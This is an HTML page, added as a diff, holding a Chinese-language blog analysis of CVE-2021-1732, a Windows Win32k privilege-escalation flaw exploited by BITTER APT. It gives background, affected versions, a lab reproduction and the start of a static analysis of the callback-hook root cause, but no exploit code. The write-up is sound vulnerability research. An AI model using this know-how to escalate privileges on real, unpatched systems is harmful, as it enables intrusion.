@@ -1,0 +1,1099 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next pisces use-motion" lang="zh-Hans">
+<head><meta name="generator" content="Hexo 3.9.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform">
+<meta http-equiv="Cache-Control" content="no-siteapp">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">
+
+
+
+
+  
+  
+  
+  
+
+  
+    
+    
+  
+
+  
+    
+      
+    
+
+    
+  
+
+  
+
+  
+
+  
+    
+      
+    
+
+    
+  
+
+  
+    
+    
+    <link href="https://fonts.cat.net/css?family=Lato:300,300italic,400,400italic,700,700italic|Roboto Slab:300,300italic,400,400italic,700,700italic|Roboto Mono:300,300italic,400,400italic,700,700italic&subset=latin,latin-ext" rel="stylesheet" type="text/css">
+  
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.jpg?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.jpg?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.jpg?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="win32k">
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="&amp;#x4E00;&amp;#x3001;&amp;#x6F0F;&amp;#x6D1E;&amp;#x4FE1;&amp;#x606F;1.&amp;#x80CC;&amp;#x666F;2021&amp;#x5E74;2&amp;#x6708;10&amp;#x65E5;&amp;#xFF0C;&amp;#x5B89;&amp;#x6052;&amp;#x516C;&amp;#x5F00;&amp;#x62AB;&amp;#x9732;&amp;#x4E86;&amp;#x5176;&amp;#x5728;2020&amp;#x5E74;12&amp;#x6708;&amp;">
+<meta name="keywords" content="win32k">
+<meta property="og:type" content="article">
+<meta property="og:title" content="CVE-2021-1732：BITTER APT用于定向攻击的Windows内核提权漏洞原理及利用分析">
+<meta property="og:url" content="https://saturn35.github.io/2021/03/16/20210316-1/index.html">
+<meta property="og:site_name" content="Saturn35">
+<meta property="og:description" content="&amp;#x4E00;&amp;#x3001;&amp;#x6F0F;&amp;#x6D1E;&amp;#x4FE1;&amp;#x606F;1.&amp;#x80CC;&amp;#x666F;2021&amp;#x5E74;2&amp;#x6708;10&amp;#x65E5;&amp;#xFF0C;&amp;#x5B89;&amp;#x6052;&amp;#x516C;&amp;#x5F00;&amp;#x62AB;&amp;#x9732;&amp;#x4E86;&amp;#x5176;&amp;#x5728;2020&amp;#x5E74;12&amp;#x6708;&amp;">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="https://saturn35.github.io/2021/03/16/20210316-1/1614074578705.png">
+<meta property="og:image" content="https://saturn35.github.io/2021/03/16/20210316-1/1614320280105.png">
+<meta property="og:image" content="https://saturn35.github.io/2021/03/16/20210316-1/1614320476261.png">
+<meta property="og:image" content="https://saturn35.github.io/2021/03/16/20210316-1/1614925896604.png">
+<meta property="og:image" content="https://saturn35.github.io/2021/03/16/20210316-1/1614233973175.png">
+<meta property="og:image" content="https://saturn35.github.io/2021/03/16/20210316-1/1614233889756.png">
+<meta property="og:image" content="https://saturn35.github.io/2021/03/16/20210316-1/1614242158626.png">
+<meta property="og:image" content="https://saturn35.github.io/2021/03/16/20210316-1/1614322205853.png">
+<meta property="og:image" content="https://saturn35.github.io/2021/03/16/20210316-1/1615289171455.png">
+<meta property="og:image" content="https://saturn35.github.io/2021/03/16/20210316-1/1615295996624.png">
+<meta property="og:image" content="https://saturn35.github.io/2021/03/16/20210316-1/1615360497050.png">
+<meta property="og:image" content="https://saturn35.github.io/2021/03/16/20210316-1/1615360670476.png">
+<meta property="og:image" content="https://saturn35.github.io/2021/03/16/20210316-1/1615360939325.png">
+<meta property="og:image" content="https://saturn35.github.io/2021/03/16/20210316-1/1615361008031.png">
+<meta property="og:image" content="https://saturn35.github.io/2021/03/16/20210316-1/1615361883275.png">
+<meta property="og:image" content="https://saturn35.github.io/2021/03/16/20210316-1/1615362694800.png">
+<meta property="og:image" content="https://saturn35.github.io/2021/03/16/20210316-1/1615364228733.png">
+<meta property="og:image" content="https://saturn35.github.io/2021/03/16/20210316-1/1615364635337.png">
+<meta property="og:image" content="https://saturn35.github.io/2021/03/16/20210316-1/1615368744104.png">
+<meta property="og:image" content="https://saturn35.github.io/2021/03/16/20210316-1/1615369039846.png">
+<meta property="og:image" content="https://saturn35.github.io/2021/03/16/20210316-1/1615370785000.png">
+<meta property="og:image" content="https://saturn35.github.io/2021/03/16/20210316-1/1615371656352.png">
+<meta property="og:image" content="https://saturn35.github.io/2021/03/16/20210316-1/1615343464986.png">
+<meta property="og:image" content="https://saturn35.github.io/2021/03/16/20210316-1/1615376600000.png">
+<meta property="og:image" content="https://saturn35.github.io/2021/03/16/20210316-1/1615377384132.png">
+<meta property="og:image" content="https://saturn35.github.io/2021/03/16/20210316-1/1614588640393.png">
+<meta property="og:image" content="https://saturn35.github.io/2021/03/16/20210316-1/1615382670446.png">
+<meta property="og:image" content="https://saturn35.github.io/2021/03/16/20210316-1/1615536517246.png">
+<meta property="og:image" content="https://saturn35.github.io/2021/03/16/20210316-1/1615536994130.png">
+<meta property="og:image" content="https://saturn35.github.io/2021/03/16/20210316-1/1615537726621.png">
+<meta property="og:image" content="https://saturn35.github.io/2021/03/16/20210316-1/1615346562069.png">
+<meta property="og:image" content="https://saturn35.github.io/2021/03/16/20210316-1/1.gif">
+<meta property="og:updated_time" content="2021-03-16T11:57:22.027Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="CVE-2021-1732：BITTER APT用于定向攻击的Windows内核提权漏洞原理及利用分析">
+<meta name="twitter:description" content="&amp;#x4E00;&amp;#x3001;&amp;#x6F0F;&amp;#x6D1E;&amp;#x4FE1;&amp;#x606F;1.&amp;#x80CC;&amp;#x666F;2021&amp;#x5E74;2&amp;#x6708;10&amp;#x65E5;&amp;#xFF0C;&amp;#x5B89;&amp;#x6052;&amp;#x516C;&amp;#x5F00;&amp;#x62AB;&amp;#x9732;&amp;#x4E86;&amp;#x5176;&amp;#x5728;2020&amp;#x5E74;12&amp;#x6708;&amp;">
+<meta name="twitter:image" content="https://saturn35.github.io/2021/03/16/20210316-1/1614074578705.png">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Pisces',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="https://saturn35.github.io/2021/03/16/20210316-1/">
+
+
+
+
+
+
+  <title>CVE-2021-1732：BITTER APT用于定向攻击的Windows内核提权漏洞原理及利用分析 | Saturn35</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Saturn35</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br>
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br>
+            
+            关于
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>
+            
+            归档
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://saturn35.github.io/2021/03/16/20210316-1/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Saturn35">
+      <meta itemprop="description" content>
+      <meta itemprop="image" content="/images/head.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Saturn35">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">CVE-2021-1732：BITTER APT用于定向攻击的Windows内核提权漏洞原理及利用分析</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2021-03-16T19:12:00+08:00">
+                2021-03-16
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+              <span class="post-comments-count">
+                <span class="post-meta-divider">|</span>
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-comment-o"></i>
+                </span>
+                <a href="/2021/03/16/20210316-1/#comments" itemprop="discussionUrl">
+                  <span class="post-comments-count valine-comment-count" data-xid="/2021/03/16/20210316-1/" itemprop="commentCount"></span>
+                </a>
+              </span>
+            
+          
+
+          
+          
+
+          
+
+          
+            <div class="post-wordcount">
+              
+                
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-file-word-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">字数统计&#58;</span>
+                
+                <span title="字数统计">
+                  6,012
+                </span>
+              
+
+              
+                <span class="post-meta-divider">|</span>
+              
+
+              
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-clock-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
+                
+                <span title="阅读时长">
+                  26
+                </span>
+              
+            </div>
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h2 id="&#x4E00;&#x3001;&#x6F0F;&#x6D1E;&#x4FE1;&#x606F;"><a href="#&#x4E00;&#x3001;&#x6F0F;&#x6D1E;&#x4FE1;&#x606F;" class="headerlink" title="&#x4E00;&#x3001;&#x6F0F;&#x6D1E;&#x4FE1;&#x606F;"></a>&#x4E00;&#x3001;&#x6F0F;&#x6D1E;&#x4FE1;&#x606F;</h2><h3 id="1-&#x80CC;&#x666F;"><a href="#1-&#x80CC;&#x666F;" class="headerlink" title="1.&#x80CC;&#x666F;"></a>1.&#x80CC;&#x666F;</h3><p>2021&#x5E74;2&#x6708;10&#x65E5;&#xFF0C;&#x5B89;&#x6052;&#x516C;&#x5F00;<a href="https://ti.dbappsecurity.com.cn/blog/index.php/2021/02/10/windows-kernel-zero-day-exploit-is-used-by-bitter-apt-in-targeted-attack/" target="_blank" rel="noopener">&#x62AB;&#x9732;</a>&#x4E86;&#x5176;&#x5728;2020&#x5E74;12&#x6708;&#x4EFD;&#x6355;&#x83B7;&#x5230;&#x7684;&#x4E00;&#x4E2A;Windows&#x5185;&#x6838;&#x63D0;&#x6743;0day&#x6F0F;&#x6D1E;&#x7684;&#x76F8;&#x5173;&#x4FE1;&#x606F;&#xFF0C;&#x6F0F;&#x6D1E;&#x7F16;&#x53F7;&#x4E3A;CVE-2021-1732&#x3002;&#x6B64;&#x6F0F;&#x6D1E;&#x4E3A;Windows Win32k&#x7EC4;&#x4EF6;&#x9A71;&#x52A8;&#x6A21;&#x5757;win32kfull.sys&#x4E2D;&#x5B58;&#x5728;&#x7684;&#x4EE3;&#x7801;&#x903B;&#x8F91;bug&#xFF0C;&#x7531;&#x67D0;APT&#x7EC4;&#x7EC7;&#x5728;&#x8FDB;&#x884C;&#x5B9A;&#x5411;&#x653B;&#x51FB;&#x65F6;&#xFF0C;&#x88AB;&#x68C0;&#x6D4B;&#x548C;&#x53D1;&#x73B0;&#x3002;&#x5FAE;&#x8F6F;&#x5728;2021&#x5E74;2&#x6708;&#x7684;&#x66F4;&#x65B0;&#x4E2D;&#x5DF2;&#x5C06;&#x6B64;&#x6F0F;&#x6D1E;&#x4FEE;&#x590D;&#x3002;</p>
+<h3 id="2-&#x6F0F;&#x6D1E;&#x7B80;&#x8FF0;"><a href="#2-&#x6F0F;&#x6D1E;&#x7B80;&#x8FF0;" class="headerlink" title="2. &#x6F0F;&#x6D1E;&#x7B80;&#x8FF0;"></a>2. &#x6F0F;&#x6D1E;&#x7B80;&#x8FF0;</h3><p>&#x6F0F;&#x6D1E;&#x7531;win32kfull!xxxCreateWindowEx&#x4E2D;&#x7684;xxxClientAllocWindowClassExtraBytes&#x56DE;&#x8C03;&#x51FD;&#x6570;&#x5F15;&#x8D77;&#xFF0C;&#x5BFC;&#x81F4;&#x5185;&#x6838;&#x7ED3;&#x6784;&#x6210;&#x5458;&#x53CA;&#x5176;&#x5BF9;&#x5E94;&#x6807;&#x5FD7;&#x7684;&#x8BBE;&#x7F6E;&#x4E0D;&#x540C;&#x6B65;&#x3002;</p>
+<p>win32kfull!xxxCreateWindowEx&#x521B;&#x5EFA;&#x5177;&#x6709;WndExtra&#x6210;&#x5458;&#x7684;&#x7A97;&#x53E3;&#x65F6;&#xFF0C;&#x5B83;&#x5C06;&#x8C03;&#x7528;win32kfull!xxxClientAllocWindowClassExtraBytes&#x89E6;&#x53D1;&#x56DE;&#x8C03;&#xFF0C;&#x8BE5;&#x56DE;&#x8C03;&#x5C06;&#x8FD4;&#x56DE;&#x7528;&#x6237;&#x6A21;&#x5F0F;User32!_xxxClientAllocWindowClassExtraBytesh&#x51FD;&#x6570;&#x4EE5;&#x5206;&#x914D;WndExtra&#x6210;&#x5458;&#x3002;&#x653B;&#x51FB;&#x8005;hook&#x6B64;&#x56DE;&#x8C03;&#x51FD;&#x6570;&#x540E;&#xFF0C;&#x5728;&#x81EA;&#x5B9A;&#x4E49;&#x56DE;&#x8C03;&#x51FD;&#x6570;&#x4E2D;&#xFF0C;&#x8C03;&#x7528;NtUserConsoleControl&#x5E76;&#x4F20;&#x5165;&#x5F53;&#x524D;&#x7A97;&#x53E3;&#x7684;&#x53E5;&#x67C4;&#xFF0C;&#x8FD9;&#x4F1A;&#x5C06;&#x5185;&#x6838;tagWND&#x6210;&#x5458;&#xFF08;&#x6307;&#x5411;WndExtra&#x533A;&#x57DF;&#xFF09;&#x66F4;&#x6539;&#x4E3A;offset&#x503C;&#xFF0C;&#x5E76;&#x8BBE;&#x7F6E;&#x76F8;&#x5E94;&#x7684;&#x6807;&#x5FD7;&#x4EE5;&#x6307;&#x793A;&#x8BE5;&#x6210;&#x5458;&#x73B0;&#x5728;&#x4E3A;&#x504F;&#x79FB;&#x91CF;&#xFF08;&#x76F8;&#x5BF9;&#x5BFB;&#x5740;&#x65B9;&#x5F0F;&#xFF09;&#x3002;&#x4E4B;&#x540E;&#xFF0C;&#x653B;&#x51FB;&#x8005;&#x53EF;&#x4EE5;&#x5728;&#x81EA;&#x5B9A;&#x4E49;&#x56DE;&#x8C03;&#x4E2D;&#x8C03;&#x7528;NtCallbackReturn&#x5E76;&#x8FD4;&#x56DE;&#x4EFB;&#x610F;&#x503C;&#x3002;&#x8FD4;&#x56DE;&#x5185;&#x6838;&#x6A21;&#x5F0F;&#xFF0C;&#x8FD4;&#x56DE;&#x503C;&#x5C06;&#x8986;&#x76D6;&#x5148;&#x524D;&#x7684;offset&#x6210;&#x5458;&#xFF0C;&#x4F46;&#x4E0D;&#x4F1A;&#x6E05;&#x9664;&#x76F8;&#x5E94;&#x7684;&#x6807;&#x5FD7;&#x3002;&#x4E4B;&#x540E;&#xFF0C;&#x5185;&#x6838;&#x4EE3;&#x7801;&#x5C06;&#x672A;&#x7ECF;&#x68C0;&#x67E5;&#x7684;Offset&#x503C;&#x76F4;&#x63A5;&#x7528;&#x4E8E;&#x5806;&#x5185;&#x5B58;&#x5BFB;&#x5740;&#x3002;</p>
+<ul>
+<li>&#x6F0F;&#x6D1E;&#x540D;&#x79F0;&#xFF1A;Windows Win32k&#x6743;&#x9650;&#x63D0;&#x5347;&#x6F0F;&#x6D1E;</li>
+<li>&#x6F0F;&#x6D1E;&#x7F16;&#x53F7;&#xFF1A;CVE-2021-1732</li>
+<li>&#x6F0F;&#x6D1E;&#x7C7B;&#x578B;&#xFF1A;&#x8BBE;&#x8BA1;&#x7F3A;&#x9677;</li>
+<li>&#x6F0F;&#x6D1E;&#x5F71;&#x54CD;&#xFF1A;&#x672C;&#x5730;&#x6743;&#x9650;&#x63D0;&#x5347;</li>
+<li>CVSS&#x8BC4;&#x5206;&#xFF1A;7.8</li>
+<li>&#x5229;&#x7528;&#x96BE;&#x5EA6;&#xFF1A;Exploitation Detected</li>
+<li>&#x57FA;&#x7840;&#x6743;&#x9650;&#xFF1A;&#x666E;&#x901A;&#x7528;&#x6237;&#x6743;&#x9650;</li>
+</ul>
+<h3 id="3-&#x6F0F;&#x6D1E;&#x5F71;&#x54CD;"><a href="#3-&#x6F0F;&#x6D1E;&#x5F71;&#x54CD;" class="headerlink" title="3.&#x6F0F;&#x6D1E;&#x5F71;&#x54CD;"></a>3.&#x6F0F;&#x6D1E;&#x5F71;&#x54CD;</h3><p>Windows Server, version 20H2 (Server Core Installation)</p>
+<p>Windows 10 Version 20H2 for ARM64-based Systems</p>
+<p>Windows 10 Version 20H2 for 32-bit Systems</p>
+<p>Windows 10 Version 20H2 for x64-based Systems</p>
+<p>Windows Server, version 2004 (Server Core installation)</p>
+<p>Windows 10 Version 2004 for x64-based Systems</p>
+<p>Windows 10 Version 2004 for ARM64-based Systems</p>
+<p>Windows 10 Version 2004 for 32-bit Systems</p>
+<p>Windows Server, version 1909 (Server Core installation)</p>
+<p>Windows 10 Version 1909 for ARM64-based Systems</p>
+<p>Windows 10 Version 1909 for x64-based Systems</p>
+<p>Windows 10 Version 1909 for 32-bit Systems</p>
+<p>Windows Server 2019 (Server Core installation)</p>
+<p>Windows Server 2019</p>
+<p>Windows 10 Version 1809 for ARM64-based Systems</p>
+<p>Windws 10 Version 1809 for x64-based Systems</p>
+<p>Windows 10 Version 1809 for 32-bit Systems</p>
+<p>Windows 10 Version 1803 for ARM64-based Systems</p>
+<p>Windows 10 Version 1803 for x64-based Systems</p>
+<p>Windows 10 Version 1803 for 32-bit Systems</p>
+<h2 id="&#x4E8C;&#x3001;&#x6F0F;&#x6D1E;&#x590D;&#x73B0;"><a href="#&#x4E8C;&#x3001;&#x6F0F;&#x6D1E;&#x590D;&#x73B0;" class="headerlink" title="&#x4E8C;&#x3001;&#x6F0F;&#x6D1E;&#x590D;&#x73B0;"></a>&#x4E8C;&#x3001;&#x6F0F;&#x6D1E;&#x590D;&#x73B0;</h2><h3 id="1-&#x73AF;&#x5883;&#x642D;&#x5EFA;"><a href="#1-&#x73AF;&#x5883;&#x642D;&#x5EFA;" class="headerlink" title="1. &#x73AF;&#x5883;&#x642D;&#x5EFA;"></a>1. &#x73AF;&#x5883;&#x642D;&#x5EFA;</h3><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#x9776;&#x673A;&#xFF1A;Windows10 <span class="number">1909</span>(<span class="number">18363.1316</span>)   windows10 (<span class="number">19042.746</span>)</span><br><span class="line">&#x8C03;&#x8BD5;&#x673A;&#xFF1A;Windows10 <span class="number">1909</span>(<span class="number">18363.1316</span>) </span><br><span class="line">&#x5DE5;&#x5177;&#xFF1A;windbg   IDA <span class="number">7.5</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="2-&#x590D;&#x73B0;&#x8FC7;&#x7A0B;"><a href="#2-&#x590D;&#x73B0;&#x8FC7;&#x7A0B;" class="headerlink" title="2. &#x590D;&#x73B0;&#x8FC7;&#x7A0B;"></a>2. &#x590D;&#x73B0;&#x8FC7;&#x7A0B;</h3><p>windows10 20H2&#xFF08;19042.746&#xFF09;&#x6267;&#x884C;&#x6837;&#x672C;&#x6587;&#x4EF6;&#xFF0C;&#x84DD;&#x5C4F;&#x3002;</p>
+<p><img src="/2021/03/16/20210316-1/1614074578705.png" alt="img"></p>
+<p>Windows10 1909(18363.1316),&#x6837;&#x672C;&#x6587;&#x4EF6;&#x5F00;&#x59CB;&#x6267;&#x884C;&#x65F6;&#x4E3A;&#x4E2D;&#x5B8C;&#x6574;&#x6027;&#xFF08;Medium&#xFF09;&#x3002;</p>
+<p><img src="/2021/03/16/20210316-1/1614320280105.png" alt="1614320280105"></p>
+<p>&#x6267;&#x884C;&#x5B8C;&#x5229;&#x7528;&#x7A0B;&#x5E8F;&#x540E;&#xFF0C;&#x53D8;&#x4E3A;&#x7CFB;&#x7EDF;&#x7EA7;&#x5B8C;&#x6574;&#x6027;&#xFF08;System&#xFF09;&#x3002;</p>
+<p><img src="/2021/03/16/20210316-1/1614320476261.png" alt="1614320476261"></p>
+<h2 id="&#x4E09;&#x3001;&#x6F0F;&#x6D1E;&#x5206;&#x6790;"><a href="#&#x4E09;&#x3001;&#x6F0F;&#x6D1E;&#x5206;&#x6790;" class="headerlink" title="&#x4E09;&#x3001;&#x6F0F;&#x6D1E;&#x5206;&#x6790;"></a>&#x4E09;&#x3001;&#x6F0F;&#x6D1E;&#x5206;&#x6790;</h2><p>&#x5B89;&#x6052;&#x7ED9;&#x51FA;&#x7684;&#x5229;&#x7528;&#x6837;&#x672C;<a href="https://ti.dbappsecurity.com.cn/blog/index.php/2021/02/10/windows-kernel-zero-day-exploit-is-used-by-bitter-apt-in-targeted-attack/" target="_blank" rel="noopener">&#x5206;&#x6790;</a>&#x5DF2;&#x7ECF;&#x76F8;&#x5F53;&#x8BE6;&#x7EC6;&#xFF0C;&#x6709;&#x5206;&#x6790;&#x57FA;&#x7840;&#x7684;&#x5E08;&#x5085;&#x4EEC;&#x53EF;&#x4EE5;&#x4E4B;&#x95F4;&#x53BB;&#x770B;&#x5B89;&#x6052;&#x7684;&#x5206;&#x6790;&#xFF0C;&#x672C;&#x7BC7;&#x5206;&#x6790;&#x662F;&#x6211;&#x7B2C;&#x4E00;&#x6B21;&#x8BE6;&#x7EC6;&#x7684;&#x5206;&#x6790;0day&#x6F0F;&#x6D1E;&#x7684;&#x5229;&#x7528;&#xFF0C;&#x5B66;&#x5230;&#x633A;&#x591A;&#x77E5;&#x8BC6;&#xFF0C;&#x4EC5;&#x505A;&#x8BB0;&#x5F55;&#x3002;</p>
+<h4 id="1-&#x57FA;&#x7840;&#x5206;&#x6790;"><a href="#1-&#x57FA;&#x7840;&#x5206;&#x6790;" class="headerlink" title="1. &#x57FA;&#x7840;&#x5206;&#x6790;"></a>1. &#x57FA;&#x7840;&#x5206;&#x6790;</h4><ul>
+<li>&#x6F0F;&#x6D1E;&#x6587;&#x4EF6;&#xFF1A;win32kfull.sys(10.0.18362.1316)</li>
+<li>&#x6F0F;&#x6D1E;&#x51FD;&#x6570;&#xFF1A;win32kfull!xxxClientAllocWindowClassExtraBytes</li>
+</ul>
+<h4 id="2-&#x9759;&#x6001;&#x5206;&#x6790;"><a href="#2-&#x9759;&#x6001;&#x5206;&#x6790;" class="headerlink" title="2. &#x9759;&#x6001;&#x5206;&#x6790;"></a>2. &#x9759;&#x6001;&#x5206;&#x6790;</h4><h5 id="1-&#x6F0F;&#x6D1E;&#x51FD;&#x6570;&#x5206;&#x6790;"><a href="#1-&#x6F0F;&#x6D1E;&#x51FD;&#x6570;&#x5206;&#x6790;" class="headerlink" title="1. &#x6F0F;&#x6D1E;&#x51FD;&#x6570;&#x5206;&#x6790;"></a>1. &#x6F0F;&#x6D1E;&#x51FD;&#x6570;&#x5206;&#x6790;</h5><p>win32kfull!xxxCreateWindowEx&#x51FD;&#x6570;&#x4E2D;&#xFF0C;&#x8C03;&#x7528;win32kfull!xxxClientAllocWindowClassExtraBytes&#x51FD;&#x6570;&#xFF0C;&#x8FD4;&#x56DE;&#x503C;&#x6765;&#x586B;&#x5145;*(tagWnd+0x28)+0x128&#x5B57;&#x6BB5;&#x3002;&#x6B64;&#x5B57;&#x6BB5;&#xFF0C;&#x53EF;&#x7406;&#x89E3;&#x4E3A;&#x7A97;&#x53E3;&#x7684;extra&#x6570;&#x636E;&#x5730;&#x5740;&#xFF0C;&#x56E0;&#x4E3A;&#x4F20;&#x5165;&#x540E;&#x4E00;&#x4E2A;&#x51FD;&#x6570;&#x7684;&#x53C2;&#x6570;&#x4E3A;*(tagWnd+0x28)+0xC8&#x5B57;&#x6BB5;&#xFF0C;&#x6B64;&#x5B57;&#x6BB5;&#x4E3A;tagWND-&gt;cbWndExtra(ULONG)&#xFF0C;&#x4EE3;&#x8868;&#x5F53;&#x524D;&#x7A97;&#x53E3;&#x4E2D;&#x7684;&#x989D;&#x5916;&#x5B57;&#x8282;&#x5927;&#x5C0F;&#xFF0C;&#x6B64;&#x503C;&#x53EF;&#x7531;&#x7A97;&#x53E3;&#x7C7B;&#x7ED3;&#x6784;&#x4F53;WNDCLASSEX&#x6210;&#x5458;cbWndExtra&#x6765;&#x8FDB;&#x884C;&#x8BBE;&#x7F6E;&#x3002;</p>
+<p><img src="/2021/03/16/20210316-1/1614925896604.png" alt="1614925896604"></p>
+<p>win32kfull!xxxClientAllocWindowClassExtraBytes&#x51FD;&#x6570;&#x4E2D;&#xFF0C;&#x901A;&#x8FC7;&#x4F7F;&#x7528;&#x7528;&#x6237;&#x56DE;&#x8C03;&#xFF0C;&#x8FDB;&#x884C;&#x7528;&#x6237;&#x6001;&#x51FD;&#x6570;&#x8C03;&#x7528;&#x3002;</p>
+<p><img src="/2021/03/16/20210316-1/1614233973175.png" alt="1614233973175"></p>
+<p>KeUserModeCallback&#x7528;&#x6237;&#x6A21;&#x5F0F;&#x56DE;&#x8C03;&#x8C03;&#x7528;KernelCallbackTable&#x4E2D;ApiNumber&#x4E3A;0x7B&#x7684;&#x51FD;&#x6570;&#xFF0C;&#x5373;User32!_xxxClientAllocWindowClassExtraBytes ,&#x800C;KeUserModeCallback&#x539F;&#x578B;&#x5982;&#x4E0B;&#xFF1A;</p>
+<figure class="highlight vbnet"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">KeUserModeCallback (</span><br><span class="line">    <span class="keyword">IN</span> <span class="built_in">ULONG</span> ApiNumber,</span><br><span class="line">    <span class="keyword">IN</span> PVOID InputBuffer,</span><br><span class="line">    <span class="keyword">IN</span> <span class="built_in">ULONG</span> InputLength,</span><br><span class="line">    OUT PVOID *OutputBuffer,</span><br><span class="line">    <span class="keyword">IN</span> PULONG OutputLength</span><br><span class="line">    )</span><br></pre></td></tr></table></figure>
+
+<p>&#x56E0;&#x6B64;&#xFF0C;&#x6211;&#x4EEC;&#x770B;&#x5230;&#xFF0C;&#x4F20;&#x5165;InputBuffer&#x4E3A;v12&#x5373;size_t* Length,InputLength&#x4E3A;4&#xFF0C;&#x6B63;&#x662F;&#x4E0A;&#x5C42;&#x4F20;&#x5165;&#x7684;cbWndExtra&#x3002;</p>
+<p><img src="/2021/03/16/20210316-1/1614233889756.png" alt="1614233889756"></p>
